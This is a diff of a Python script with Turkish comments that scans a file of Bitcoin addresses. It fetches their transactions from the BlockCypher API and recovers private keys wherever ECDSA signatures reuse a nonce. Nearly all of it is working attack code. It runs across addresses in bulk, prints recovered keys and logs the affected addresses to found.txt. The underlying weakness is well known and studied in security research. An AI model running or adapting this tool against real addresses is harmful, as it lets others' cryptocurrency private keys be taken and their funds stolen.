@@ -1,19 +1,30 @@
-import argparse
-import requests
 import time
+import requests
+from sympy import mod_inverse
 
 # Sabitler
 SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # secp256k1 prime order
 
+# Private key kurtarma fonksiyonu
+def recover_private_key(r, s1, s2, z1, z2, n):
+    try:
+        s_diff = (s1 - s2) % n
+        z_diff = (z1 - z2) % n
+        s_diff_inv = mod_inverse(s_diff, n)
+        private_key = (z_diff * s_diff_inv) % n
+        return private_key
+    except ValueError:
+        print("Modüler ters hesaplaması başarısız oldu!")
+        return None
+
 # BlockCypher API'den işlem bilgilerini çekme
 def fetch_transactions(address):
     url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}/full"
-    try:
-        response = requests.get(url)
-        response.raise_for_status()  # HTTP hatası varsa hata fırlatır
+    response = requests.get(url)
+    if response.status_code == 200:
         return response.json()
-    except requests.exceptions.RequestException as e:
-        print(f"Adres {address} için işlem bilgisi çekilemedi: {e}")
+    else:
+        print(f"API Hatası: {response.status_code} - {response.text}")
         return None
 
 # İşlem detaylarından imza bilgilerini çıkarma
@@ -39,6 +50,7 @@ def extract_signature_data(tx):
 def find_and_recover_private_keys(transactions):
     signature_map = {}
     private_keys = []
+    addresses_with_keys = []  # Private key bulunan adresler
 
     for tx in transactions:
         sigs = extract_signature_data(tx)
@@ -58,71 +70,48 @@ def find_and_recover_private_keys(transactions):
                 if private_key:
                     print(f"Aynı nonce (r) tespit edildi! Private Key: {hex(private_key)}")
                     private_keys.append(private_key)
+                    addresses_with_keys.append(tx['inputs'][0].get('addresses', [''])[0])  # İlgili adresi ekleyin
             else:
                 # İlk kez görülen r değeri
                 signature_map[r] = sig
 
-    return private_keys
-
-# Private key kurtarma fonksiyonu
-def recover_private_key(r, s1, s2, z1, z2, n):
-    try:
-        s_diff = (s1 - s2) % n
-        z_diff = (z1 - z2) % n
-        s_diff_inv = mod_inverse(s_diff, n)
-        private_key = (z_diff * s_diff_inv) % n
-        return private_key
-    except ValueError:
-        print("Modüler ters hesaplaması başarısız oldu!")
-        return None
+    return private_keys, addresses_with_keys
 
 # Ana program
 def main():
-    parser = argparse.ArgumentParser(description="Bitcoin Private Key Recovery Tool")
-    parser.add_argument("-a", "--address_file", required=True, help="Bitcoin adreslerinin bulunduğu dosya")
-    args = parser.parse_args()
+    with open("v.txt", "r") as file:
+        addresses = file.readlines()
 
-    address_file = args.address_file
-    found_addresses = []
-
-    # Adresler dosyasını oku
-    try:
-        with open(address_file, "r") as file:
-            addresses = [line.strip() for line in file.readlines()]
-    except FileNotFoundError:
-        print(f"{address_file} dosyası bulunamadı.")
-        return
-
+    # Her bir adresi sırayla işleme
     for address in addresses:
+        address = address.strip()  # Adreste boşlukları temizle
         print(f"Adres: {address} için işlem bilgileri çekiliyor...")
         data = fetch_transactions(address)
 
         if not data:
-            print(f"{address} adresi için işlem bulunamadı veya API hatası.")
-            continue  # Bu adresi atla, bir sonraki adrese geç
+            print(f"Adres {address} için işlem bulunamadı veya API hatası.")
+            continue
 
         # İşlemleri al
         transactions = data.get("txs", [])
         if not transactions:
-            print(f"{address} adresi için işlem geçmişi bulunamadı.")
-            continue  # Bu adresi atla, bir sonraki adrese geç
+            print(f"Adres {address} için işlem geçmişi bulunamadı.")
+            continue
 
         print(f"{len(transactions)} işlem bulundu. İşlem geçmişi taranıyor...")
-        private_keys = find_and_recover_private_keys(transactions)
+        private_keys, addresses_with_keys = find_and_recover_private_keys(transactions)
 
         if private_keys:
-            print(f"{len(private_keys)} adet private key kurtarıldı.")
-            found_addresses.append(address)
-            with open("found.txt", "a") as f:
-                for key in private_keys:
-                    f.write(f"Adres: {address}, Private Key: {hex(key)}\n")
+            print(f"{len(private_keys)} adet private key kurtarıldı!")
+            with open("found.txt", "a") as found_file:
+                for addr in addresses_with_keys:
+                    found_file.write(f"{addr}\n")  # Private key bulunan Bitcoin adresini yaz
+        else:
+            print(f"Adres {address} için nonce (r) tekrarı bulunamadı.")
 
-        time.sleep(5)  # API'ye aşırı yük binmesini engellemek için 5 saniye bekle
-
-    if found_addresses:
-        print(f"{len(found_addresses)} adres için private key bulundu. Bilgiler 'found.txt' dosyasına kaydedildi.")
-    else:
-        print("Hiçbir private key bulunamadı.")
+        # API banını önlemek için 5 saniye bekleyin
+        print("API banını önlemek için 5 saniye bekleniyor...")
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
